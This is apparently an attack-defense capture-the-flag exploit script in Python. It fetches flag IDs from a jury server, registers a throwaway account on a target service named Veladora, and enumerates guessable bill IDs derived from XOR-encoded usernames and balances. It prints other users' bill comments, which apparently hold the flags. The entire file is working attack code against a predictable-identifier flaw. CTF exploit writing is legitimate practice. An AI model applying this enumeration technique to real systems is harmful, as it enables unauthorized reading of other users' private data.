#!/usr/bin/env python3
from api_client import VeladoraClient
import sys
import os
import requests

X_TEAM_TOKEN = ''
JURY_URL = 'http://<ip>/flag_ids?service=4'

def get_flag_ids(team_token: str, url: str, attack_host: str):
    import json
    resp = requests.get(url, headers={'X-Team-Token':team_token})
    flag_ids = json.loads(resp.text)['flag_ids']
    for i in flag_ids:
        if flag_ids[i]['host'] == attack_host:
            return flag_ids[i]['flag_ids']

def gen_possible_bills_id(username: str):
    ids = []
    for i in range(16):
        xor_key = i
        possbile_balances = [2500, 2000, 1500, 1000, 500, 1250]
        for balance in possbile_balances:
            xored_username = ''.join([chr(ord(c) ^ xor_key) for c in username])
            xored_username_hex = xored_username.encode('utf-8').hex()
            xored_balance = balance ^ xor_key
            xored_balance_hex = hex(xored_balance)[2:].zfill(4)
            ids.append(f"{xored_username_hex}_{xored_balance_hex}_{i:02x}")
    return ids

def exploit(hostname: str, users: list):
    client = VeladoraClient(f"http://{hostname}")
    attack_user = os.urandom(16).hex()
    attack_password = os.urandom(16).hex()

    resp = client.register(attack_user, attack_password)
    client.login(attack_user, attack_password)

    for username in users:
        possible_bills_ids = gen_possible_bills_id(username)

        for bill_id in possible_bills_ids:
            try:
                bill = client.get_bill_by_id(bill_id)
            except requests.exceptions.HTTPError as e:
                continue

            if bill.get('bill').get('comment') == '':
                continue
            print(bill.get('bill').get('comment'), flush=True)


if __name__ == '__main__':
    users = get_flag_ids(X_TEAM_TOKEN, JURY_URL, sys.argv[1])
    exploit(sys.argv[1], users)
